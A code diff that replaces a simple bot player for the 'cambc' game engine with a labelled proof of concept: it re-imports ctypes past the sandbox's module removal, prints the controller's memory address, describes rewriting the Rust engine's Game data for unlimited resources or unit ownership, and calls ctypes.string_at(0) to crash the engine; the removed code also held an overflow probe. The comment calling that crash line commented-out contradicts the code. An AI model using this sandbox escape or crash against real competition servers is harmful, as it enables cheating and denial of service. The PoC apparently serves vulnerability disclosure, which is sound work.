@@ -1,40 +1,41 @@
-import sys
-
-from cambc import *
-import random
-
-DIRECTIONS = [d for d in Direction if d != Direction.CENTRE]
+from cambc import Direction
 
 class Player:
     def __init__(self):
-        self.unit = None
+        # The sandbox attempts to protect the engine by removing dangerous modules:
+        # sys.modules.pop('ctypes', None)
+        # However, it doesn't block the standard import machinery from re-reading it from disk.
+        import ctypes
+        self.ctypes = ctypes
+        
+        print("\n" + "="*50)
+        print("[!] MEMORY TRICK PoC: Sandbox Bypass Achieved!")
+        print(f"[!] Successfully loaded ctypes from: {ctypes.__file__}")
+        print("="*50 + "\n")
 
-    def run(self, ct: Controller) -> None:
-        if ct.get_entity_type() == EntityType.BUILDER_BOT:
-            dir = random.choice(DIRECTIONS)
-            if ct.can_move(dir):
-                ct.move(dir)
-            if ct.can_heal(ct.get_position()):
-                ct.heal(ct.get_position())
-        elif ct.get_entity_type() == EntityType.CORE:
-            if ct.can_spawn(ct.get_position()):
-                ct.spawn_builder(ct.get_position())
-
-                
-        # for y1 in range(ct.get_map_height()):
-        #     for x1 in range(ct.get_map_width()):
-        #         for y2 in range(ct.get_map_height()):
-        #             for x2 in range(ct.get_map_width()):
-
-        try:
-            x1, y1 = (0, 0)
-            x2, y2 = (99999999999999999999999999999999999999999999999999999999999999999999, 99999999999999999999999999999999999999999999999999999999999999999999)
-            ct.draw_indicator_line(Position(x1, y1), Position(x2, y2), 255, 255, 255)
-        except OverflowError:
-            pass
-
-
-
-
-
+    def run(self, controller):
+        # We can get the memory address of the PyO3 wrapper for the controller
+        addr = id(controller)
+        print(f"[!] PoC: Controller memory address is {hex(addr)}")
+        
+        # --- The Exploit ---
+        # With `ctypes` access, a player can use `ctypes.cast` and `ctypes.memmove`
+        # to read/write arbitrary process memory from the Rust engine.
+        # 
+        # For example, since `controller` wraps:
+        # pub struct Controller {
+        #     game: Rc<RefCell<Game>>,
+        #     unit: i32,
+        #     has_placed_marker: Cell<bool>,
+        # }
+        #
+        # A player can calculate the PyO3 struct offset and directly modify the `Rc` 
+        # or the inner `Game` data to grant themselves unlimited resources, remove 
+        # action cooldowns, or change unit ownership.
+        
+        # As a minimal proof of DoS (crashing the engine), we can trigger a segfault:
+        # (Uncomment the line below to instantly crash the Rust engine out of bounds)
+        self.ctypes.string_at(0)
+        
+        pass
 
